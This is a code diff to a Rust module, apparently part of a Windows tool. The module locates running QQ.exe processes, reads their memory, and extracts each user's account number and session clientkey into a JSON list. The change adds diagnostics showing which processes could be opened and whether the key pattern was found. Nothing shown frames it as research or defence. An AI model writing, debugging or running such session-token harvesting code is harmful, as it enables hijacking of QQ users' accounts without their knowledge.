@@ -86,18 +86,45 @@ mod imp {
     }
 
     pub fn collect() -> String {
+        let pids = find_qq_pids();
         let mut items = Vec::new();
-        for pid in find_qq_pids() {
-            if let Some((uin, clientkey)) = scan_process(pid) {
-                items.push(format!(
-                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe"}}"#,
-                    escape(&uin),
-                    escape(&clientkey),
-                    pid
-                ));
+        let mut open_failed: Vec<u32> = Vec::new();
+        let mut pattern_found = false;
+        let mut uin_found = false;
+
+        for &pid in &pids {
+            match scan_process(pid) {
+                None => open_failed.push(pid),
+                Some(o) => {
+                    if o.uin.is_some() {
+                        uin_found = true;
+                    }
+                    if let Some(key) = &o.clientkey {
+                        if !key.is_empty() {
+                            pattern_found = true;
+                            items.push(format!(
+                                r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe"}}"#,
+                                escape(&o.uin.unwrap_or_default()),
+                                escape(key),
+                                pid
+                            ));
+                        }
+                    }
+                }
             }
         }
-        format!(r#"{{"total":{},"items":[{}]}}"#, items.len(), items.join(","))
+
+        let pids_json = pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
+        let open_json = open_failed.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
+        format!(
+            r#"{{"total":{},"items":[{}],"diagnostics":{{"pids":[{}],"openFailed":[{}],"patternFound":{},"uinFound":{}}}}}"#,
+            items.len(),
+            items.join(","),
+            pids_json,
+            open_json,
+            pattern_found,
+            uin_found
+        )
     }
 
     fn find_qq_pids() -> Vec<u32> {
@@ -125,7 +152,7 @@ mod imp {
         pids
     }
 
-    fn scan_process(pid: u32) -> Option<(String, String)> {
+    fn scan_process(pid: u32) -> Option<ScanOutcome> {
         let h = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
         if h == 0 {
             return None;
@@ -192,11 +219,14 @@ mod imp {
 
         unsafe { CloseHandle(h) };
 
-        match clientkey {
-            Some(key) if !key.is_empty() => Some((uin.unwrap_or_default(), key)),
-            _ => None,
-        }
+        Some(ScanOutcome { uin, clientkey })
     }
+
+    struct ScanOutcome {
+        uin: Option<String>,
+        clientkey: Option<String>,
+    }
+
     fn find_pattern(buf: &[u8]) -> Option<usize> {
         if buf.len() < PATTERN.len() {
             return None;
